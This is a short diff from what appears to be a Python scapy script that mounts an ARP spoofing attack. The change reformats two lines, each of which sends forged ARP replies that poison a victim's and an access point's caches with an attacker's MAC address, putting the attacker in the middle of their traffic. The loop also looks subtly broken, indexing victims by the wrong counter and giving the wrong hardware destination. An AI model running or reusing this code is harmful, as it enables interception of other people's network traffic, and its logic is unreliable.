@@ -77,10 +77,8 @@ def arp():
 	for v in range(len(vip)):
 		for i in range(10):
 			print('send arp ', i)
-			sendp(Ether(dst=vip[i], src=attacker_mac)/ARP(pdst=vip[i], psrc=ap_ip, 
-		hwdst=vmac[i], hwsrc=attacker_mac, op=2))
-			sendp(Ether(dst=ap_mac, src=attacker_mac)/ARP(pdst=ap_ip, psrc=vip[i], 
-			hwdst=vmac[i], hwsrc=attacker_mac, op=2))
+			sendp(Ether(dst=vip[i], src=attacker_mac)/ARP(pdst=vip[i], psrc=ap_ip, hwdst=vmac[i], hwsrc=attacker_mac, op=2))
+			sendp(Ether(dst=ap_mac, src=attacker_mac)/ARP(pdst=ap_ip, psrc=vip[i], hwdst=vmac[i], hwsrc=attacker_mac, op=2))
 			time.sleep(0.1)
 
 # spoof_vic_pkt = Ether(src=attacker_mac,dst=vic_mac)/ARP(psrc=ap_ip, pdst=vic_ip,hwsrc=attacker_mac, op=2)	
